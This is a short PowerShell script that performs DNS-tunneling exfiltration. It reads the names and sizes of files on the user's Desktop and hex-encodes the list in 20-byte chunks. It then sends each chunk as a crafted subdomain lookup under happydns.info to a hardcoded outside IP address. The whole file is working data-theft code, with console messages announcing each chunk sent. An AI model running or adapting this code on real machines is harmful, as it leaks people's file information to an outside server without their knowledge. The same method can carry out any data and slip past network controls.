function Send-ToMyDNS {
    param([string]$HexData, [int]$Sequence, [int]$IsLast)
    $serverIP = "134.199.229.158"
    $seqStr = $Sequence.ToString("0000")
    $domain = "d$($HexData).i$($seqStr).e$($IsLast).happydns.info"
    Resolve-DnsName -Name $domain -Server $serverIP -Type A -ErrorAction SilentlyContinue | Out-Null
}

Write-Host "--- Scanning Desktop Files ---" -ForegroundColor Cyan

$fileData = Get-ChildItem -Path $HOME\Desktop | 
            Select-Object Name, Length | 
            ConvertTo-Csv -NoTypeInformation | 
            Out-String

$fileData = $fileData.Trim()

$infoBytes = [System.Text.Encoding]::ASCII.GetBytes($fileData)
$chunkSize = 20 
$totalChunks = [Math]::Max(1, [Math]::Ceiling($infoBytes.Length / $chunkSize))

Write-Host "Sending list of $($infoBytes.Length) bytes..." -ForegroundColor White

for ($i = 0; $i -lt $infoBytes.Length; $i += $chunkSize) {
    $currentSeq = [int]($i / $chunkSize) + 1
    $currentSize = [Math]::Min($chunkSize, $infoBytes.Length - $i)
    $chunk = $infoBytes[$i..($i + $currentSize - 1)]
    $hex = ($chunk | ForEach-Object { "{0:x2}" -f $_ }) -join ""
    $isEnd = if ($currentSeq -ge $totalChunks) { 1 } else { 0 }
    
    Write-Host "Sending Chunk ${currentSeq}/${totalChunks}..." -ForegroundColor Yellow
    Send-ToMyDNS -HexData $hex -Sequence $currentSeq -IsLast $isEnd
}

Write-Host "--- SUCCESS: Desktop File List Sent! ---" -ForegroundColor Green